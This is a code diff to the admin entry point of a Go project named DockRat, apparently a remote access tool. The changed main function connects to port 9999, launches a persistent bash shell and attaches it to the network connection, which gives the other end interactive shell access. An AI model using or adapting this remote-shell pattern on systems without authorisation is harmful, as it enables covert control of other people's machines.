@@ -13,11 +13,10 @@ package main
 import (
 	"bufio"
 	"fmt"
-	"io"
 	"net"
-	"os"
 
 	"github.com/Singert/DockRat/core/protocol"
+	"github.com/Singert/DockRat/core/shell"
 )
 
 // func main() {
@@ -81,48 +80,28 @@ import (
 // === /cmd/admin/main.go ===
 
 func main() {
-	ln, err := net.Listen("tcp", ":9999")
-	if err != nil {
-		panic(err)
-	}
-	fmt.Println("[*] Waiting for agent...")
-
-	conn, err := ln.Accept()
+	conn, err := net.Dial("tcp", "127.0.0.1:9999")
 	if err != nil {
 		panic(err)
 	}
 	defer conn.Close()
-	fmt.Println("[*] Agent connected.")
+	fmt.Println("[*] Connected to admin.")
 
-	stdin := bufio.NewScanner(os.Stdin)
-	for {
-		fmt.Print("Admin> ")
-		if !stdin.Scan() {
-			break
-		}
-		line := stdin.Text()
-		if line == "shell" {
-			msg := protocol.NewCommand("")
-			data, _ := protocol.EncodeWithNewline(msg)
-			conn.Write(data)
-			fmt.Println("[*] Switched to interactive shell. Press Ctrl+C to quit.")
-			startInteractiveShell(conn)
-			fmt.Println("[*] Returned from shell session.")
+	// 启动一个持久 shell
+	if err := shell.InitPersistentShell("bash"); err != nil {
+		panic(err)
+	}
+
+	scanner := bufio.NewScanner(conn)
+	for scanner.Scan() {
+		msg, err := protocol.Decode(scanner.Bytes())
+		if err != nil {
 			continue
 		}
-		fmt.Println("Unknown command. Try 'shell'.")
+		if msg.Type == "cmd" {
+			fmt.Println("[*] Attaching admin to shell...")
+			_ = shell.AttachInteractiveSession(conn)
+			fmt.Println("[*] Shell detached.")
+		}
 	}
-}
-
-func startInteractiveShell(conn net.Conn) {
-	done := make(chan struct{})
-	go func() {
-		_, _ = io.Copy(conn, os.Stdin)
-		done <- struct{}{}
-	}()
-	go func() {
-		_, _ = io.Copy(os.Stdout, conn)
-		done <- struct{}{}
-	}()
-	<-done
 }
